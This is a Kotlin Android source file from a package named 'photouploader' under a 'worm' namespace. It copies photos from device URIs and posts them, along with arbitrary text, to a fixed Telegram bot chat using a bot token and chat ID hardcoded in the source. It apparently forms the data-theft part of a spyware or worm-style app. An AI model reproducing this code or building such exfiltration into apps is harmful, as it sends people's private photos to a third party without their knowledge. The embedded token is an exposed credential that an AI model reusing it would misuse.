package com.worm.photouploader

import android.content.Context
import android.net.Uri
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

object TelegramUploader {

    private const val BOT_TOKEN = "8520009804:AAG2J7XPzQq1JwvvNEILC6NvY545XoBulLk"
    private const val CHAT_ID = "8219817771"

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    fun sendPhoto(context: Context, uri: Uri): Boolean {
        return try {
            val file = uriToFile(context, uri) ?: return false
            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"

            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart(
                    "photo", file.name,
                    file.asRequestBody("image/jpeg".toMediaType())
                )
                .build()

            val request = Request.Builder().url(url).post(body).build()
            client.newCall(request).execute().use { resp ->
                file.delete()
                resp.isSuccessful
            }
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    fun sendText(text: String): Boolean {
        return try {
            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("text", text)
                .build()
            val request = Request.Builder().url(url).post(body).build()
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            false
        }
    }

    private fun uriToFile(context: Context, uri: Uri): File? {
        return try {
            val input = context.contentResolver.openInputStream(uri) ?: return null
            val tempFile = File(context.cacheDir, "upload_${System.currentTimeMillis()}.jpg")
            FileOutputStream(tempFile).use { out -> input.copyTo(out) }
            input.close()
            tempFile
        } catch (e: Exception) {
            null
        }
    }
}
